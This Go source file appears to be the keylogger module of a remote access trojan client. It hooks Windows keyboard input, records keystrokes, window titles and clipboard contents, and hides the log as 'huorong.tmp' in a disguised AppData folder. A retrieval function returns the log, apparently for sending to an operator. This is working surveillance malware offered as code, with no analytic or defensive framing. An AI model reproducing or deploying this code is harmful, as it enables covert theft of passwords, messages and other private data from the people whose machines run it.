package keyinfo

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/user"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/AllenDang/w32"
	"wpg.ratcli/client/clipboard"
)

//未按shift
var keys_low = map[uint16]string{
	8:   "[Back]",
	9:   "[Tab]",
	10:  "[Shift]",
	13:  "[Enter]\r\n",
	14:  "",
	15:  "",
	16:  "",
	17:  "[Ctrl]",
	18:  "[Alt]",
	19:  "",
	20:  "", //CAPS LOCK
	27:  "[Esc]",
	32:  " ", //SPACE
	33:  "[PageUp]",
	34:  "[PageDown]",
	35:  "[End]",
	36:  "[Home]",
	37:  "[Left]",
	38:  "[Up]",
	39:  "[Right]",
	40:  "[Down]",
	41:  "[Select]",
	42:  "[Print]",
	43:  "[Execute]",
	44:  "[PrintScreen]",
	45:  "[Insert]",
	46:  "[Delete]",
	47:  "[Help]",
	48:  "0",
	49:  "1",
	50:  "2",
	51:  "3",
	52:  "4",
	53:  "5",
	54:  "6",
	55:  "7",
	56:  "8",
	57:  "9",
	65:  "a",
	66:  "b",
	67:  "c",
	68:  "d",
	69:  "e",
	70:  "f",
	71:  "g",
	72:  "h",
	73:  "i",
	74:  "j",
	75:  "k",
	76:  "l",
	77:  "m",
	78:  "n",
	79:  "o",
	80:  "p",
	81:  "q",
	82:  "r",
	83:  "s",
	84:  "t",
	85:  "u",
	86:  "v",
	87:  "w",
	88:  "x",
	89:  "y",
	90:  "z",
	91:  "[Windows]",
	92:  "[Windows]",
	93:  "[Applications]",
	94:  "",
	95:  "[Sleep]",
	96:  "0",
	97:  "1",
	98:  "2",
	99:  "3",
	100: "4",
	101: "5",
	102: "6",
	103: "7",
	104: "8",
	105: "9",
	106: "*",
	107: "+",
	108: "[Separator]",
	109: "-",
	110: ".",
	111: "[Divide]",
	112: "[F1]",
	113: "[F2]",
	114: "[F3]",
	115: "[F4]",
	116: "[F5]",
	117: "[F6]",
	118: "[F7]",
	119: "[F8]",
	120: "[F9]",
	121: "[F10]",
	122: "[F11]",
	123: "[F12]",
	144: "[NumLock]",
	145: "[ScrollLock]",
	160: "", //LShift
	161: "", //RShift
	162: "[Ctrl]",
	163: "[Ctrl]",
	164: "[Alt]", //LeftMenu
	165: "[RightMenu]",
	186: ";",
	187: "=",
	188: ",",
	189: "-",
	190: ".",
	191: "/",
	192: "`",
	219: "[",
	220: "\\",
	221: "]",
	222: "'",
	223: "!",
}

//SHIFT
var keys_high = map[uint16]string{
	8:   "[Back]",
	9:   "[Tab]",
	10:  "[Shift]",
	13:  "[Enter]\r\n",
	17:  "[Ctrl]",
	18:  "[Alt]",
	20:  "", //CAPS LOCK
	27:  "[Esc]",
	32:  " ", //SPACE
	33:  "[PageUp]",
	34:  "[PageDown]",
	35:  "[End]",
	36:  "[Home]",
	37:  "[Left]",
	38:  "[Up]",
	39:  "[Right]",
	40:  "[Down]",
	41:  "[Select]",
	42:  "[Print]",
	43:  "[Execute]",
	44:  "[PrintScreen]",
	45:  "[Insert]",
	46:  "[Delete]",
	47:  "[Help]",
	48:  ")",
	49:  "!",
	50:  "@",
	51:  "#",
	52:  "$",
	53:  "%",
	54:  "^",
	55:  "&",
	56:  "*",
	57:  "(",
	65:  "A",
	66:  "B",
	67:  "C",
	68:  "D",
	69:  "E",
	70:  "F",
	71:  "G",
	72:  "H",
	73:  "I",
	74:  "J",
	75:  "K",
	76:  "L",
	77:  "M",
	78:  "N",
	79:  "O",
	80:  "P",
	81:  "Q",
	82:  "R",
	83:  "S",
	84:  "T",
	85:  "U",
	86:  "V",
	87:  "W",
	88:  "X",
	89:  "Y",
	90:  "Z",
	91:  "[Windows]",
	92:  "[Windows]",
	93:  "[Applications]",
	94:  "",
	95:  "[Sleep]",
	96:  "0",
	97:  "1",
	98:  "2",
	99:  "3",
	100: "4",
	101: "5",
	102: "6",
	103: "7",
	104: "8",
	105: "9",
	106: "*",
	107: "+",
	108: "[Separator]",
	109: "-",
	110: ".",
	111: "[Divide]",
	112: "[F1]",
	113: "[F2]",
	114: "[F3]",
	115: "[F4]",
	116: "[F5]",
	117: "[F6]",
	118: "[F7]",
	119: "[F8]",
	120: "[F9]",
	121: "[F10]",
	122: "[F11]",
	123: "[F12]",
	144: "[NumLock]",
	145: "[ScrollLock]",
	160: "", //LShift
	161: "", //RShift
	162: "[Ctrl]",
	163: "[Ctrl]",
	164: "[Alt]", //LeftMenu
	165: "[RightMenu]",
	186: ":",
	187: "+",
	188: "<",
	189: "_",
	190: ">",
	191: "?",
	192: "~",
	219: "°",
	220: "|",
	221: "}",
	222: "\"",
	223: "!",
}

//大小写
var capup = map[uint16]string{
	8:   "[Back]",
	9:   "[Tab]",
	10:  "[Shift]",
	13:  "[Enter]\r\n",
	14:  "",
	15:  "",
	16:  "",
	17:  "[Ctrl]",
	18:  "[Alt]",
	19:  "",
	20:  "", //CAPS LOCK
	27:  "[Esc]",
	32:  " ", //SPACE
	33:  "[PageUp]",
	34:  "[PageDown]",
	35:  "[End]",
	36:  "[Home]",
	37:  "[Left]",
	38:  "[Up]",
	39:  "[Right]",
	40:  "[Down]",
	41:  "[Select]",
	42:  "[Print]",
	43:  "[Execute]",
	44:  "[PrintScreen]",
	45:  "[Insert]",
	46:  "[Delete]",
	47:  "[Help]",
	48:  "0",
	49:  "1",
	50:  "2",
	51:  "3",
	52:  "4",
	53:  "5",
	54:  "6",
	55:  "7",
	56:  "8",
	57:  "9",
	65:  "A",
	66:  "B",
	67:  "C",
	68:  "D",
	69:  "E",
	70:  "F",
	71:  "G",
	72:  "H",
	73:  "I",
	74:  "J",
	75:  "K",
	76:  "L",
	77:  "M",
	78:  "N",
	79:  "O",
	80:  "P",
	81:  "P",
	82:  "R",
	83:  "S",
	84:  "T",
	85:  "U",
	86:  "V",
	87:  "W",
	88:  "X",
	89:  "Y",
	90:  "Z",
	91:  "[Windows]",
	92:  "[Windows]",
	93:  "[Applications]",
	94:  "",
	95:  "[Sleep]",
	96:  "0",
	97:  "1",
	98:  "2",
	99:  "3",
	100: "4",
	101: "5",
	102: "6",
	103: "7",
	104: "8",
	105: "9",
	106: "*",
	107: "+",
	108: "[Separator]",
	109: "-",
	110: ".",
	111: "[Divide]",
	112: "[F1]",
	113: "[F2]",
	114: "[F3]",
	115: "[F4]",
	116: "[F5]",
	117: "[F6]",
	118: "[F7]",
	119: "[F8]",
	120: "[F9]",
	121: "[F10]",
	122: "[F11]",
	123: "[F12]",
	144: "[NumLock]",
	145: "[ScrollLock]",
	160: "", //LShift
	161: "", //RShift
	162: "[Ctrl]",
	163: "[Ctrl]",
	164: "[Alt]", //LeftMenu
	165: "[RightMenu]",
	186: ";",
	187: "=",
	188: ",",
	189: "-",
	190: ".",
	191: "/",
	192: "`",
	219: "[",
	220: "\\",
	221: "]",
	222: "'",
	223: "!",
}

var (
	user32                  = syscall.NewLazyDLL("user32.dll")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")
	procGetKeyState         = user32.NewProc("GetKeyState")
)

var (
	logtext  string
	prectext string
	filename = "huorong.tmp"
)

// 获取最前面的窗口的句柄
func getForegroundWindow() (hwnd syscall.Handle) {
	windowhandle, _, _ := procGetForegroundWindow.Call()
	hwnd = syscall.Handle(windowhandle)
	return
}

//  根据句柄获取指定窗口的title
func getWindowsText(hwnd syscall.Handle) (windowsTitle string) {
	title := make([]uint16, 200)
	r0, _, _ := procGetWindowTextW.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&title[0])), uintptr(len(title)))
	len := int32(r0)
	if len != 0 {
		windowsTitle = syscall.UTF16ToString(title)
	}
	return
}

// 监控title信息
func WindowsLogger() {
	var windowtitle string
	for {
		windowHandle := getForegroundWindow()
		if windowHandle == 0 {
			continue
		}
		tmptitle := getWindowsText(windowHandle)
		if tmptitle != "" && tmptitle != windowtitle {
			windowtitle = tmptitle
			logtext += fmt.Sprintf("\n[%s]\n", windowtitle)
		} else {
			continue
		}
		time.Sleep(1 * time.Millisecond)
	}
}

// 获取键盘输入信息
func KeyInfo() {
	// 大小写锁定键
	CAPS, _, _ := procGetKeyState.Call(uintptr(w32.VK_CAPITAL))
	CAPS = CAPS & 0x000001
	var CAPS2 uintptr
	// var SHIFT uintptr
	var hook w32.HHOOK
	hook = w32.SetWindowsHookEx(w32.WH_KEYBOARD_LL, (w32.HOOKPROC)(func(i int, w w32.WPARAM, l w32.LPARAM) w32.LRESULT {
		// 检测消息是否为按下键盘的信息
		if i == 0 && w == w32.WM_KEYDOWN {
			// 判断是否按下shift键
			SHIFT := w32.GetAsyncKeyState(w32.VK_SHIFT)
			if SHIFT == 32769 || SHIFT == 32768 {
				SHIFT = 1
			}
			kbstruct := (*w32.KBDLLHOOKSTRUCT)(unsafe.Pointer(l))
			code := byte(kbstruct.VkCode)
			if code == w32.VK_CAPITAL {
				if CAPS == 1 {
					CAPS = 0
				} else {
					CAPS = 1
				}
			}
			if SHIFT == 1 {
				CAPS2 = 1
			} else {
				CAPS2 = 0
			}
			//未按shift
			if CAPS == 0 && CAPS2 == 0 {
				logtext += keys_low[uint16(code)]

			} else if CAPS2 == 1 {
				logtext += keys_high[uint16(code)]
			} else {
				logtext += capup[uint16(code)]
			}
		}
		if logtext != "" {
			savefile(logtext)
			// todo: 保存信息
			prectext = logtext
			logtext = ""
		}
		return w32.CallNextHookEx(hook, i, w, l)
	}), 0, 0)

	// 判断主进程是否已经关闭
	var msg w32.MSG
	for w32.GetMessage(&msg, 0, 0, 0) != 0 {
		time.Sleep(1 * time.Millisecond)
	}
	// 解除hook
	w32.UnhookWindowsHookEx(hook)
	hook = 0
}

// 剪切板信息
func clipboardLogger() {
	text, _ := clipboard.ReadAll()
	for {
		text1, _ := clipboard.ReadAll()
		if text1 != "" && text1 != text {
			logtext += string("\r\n[Clipboard: " + text1 + "]\r\n")
			text = text1
		}
		time.Sleep(20 * time.Millisecond)
	}
}

// 写入文件中
func getAppData() string {
	usr, _ := user.Current()
	app := usr.HomeDir + "\\AppData\\Local\\Packages\\Microsoft.Messaging\\"
	return app
}
func isExist(filename string) bool {
	_, err := os.Stat(filename)
	return err == nil
}

func getlogfile() string {
	directory := getAppData()
	dir := strings.Replace(directory, "\\", "/", -1)
	return dir + filename
}

func savefile(str string) {
	directory := getAppData()
	dir := strings.Replace(directory, "\\", "/", -1)
	if !isExist(dir) {
		err := os.MkdirAll(dir, 0777)
		if err != nil {
			return
		}
	}

	f, err := os.OpenFile(dir+filename, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	// log.SetOutput(f)
	// log.Print(str)
	f.Write([]byte(str))
	time.Sleep(20 * time.Millisecond)
}

func StartKeyInfo() {
	go clipboardLogger()
	go WindowsLogger()
	KeyInfo()
}

// 获取文件流信息
func GetKeyInfo() []byte {
	filepath := getlogfile()
	file, err := ioutil.ReadFile(filepath)
	if err != nil {
		fmt.Println(err)
		return nil
	}
	return file
}
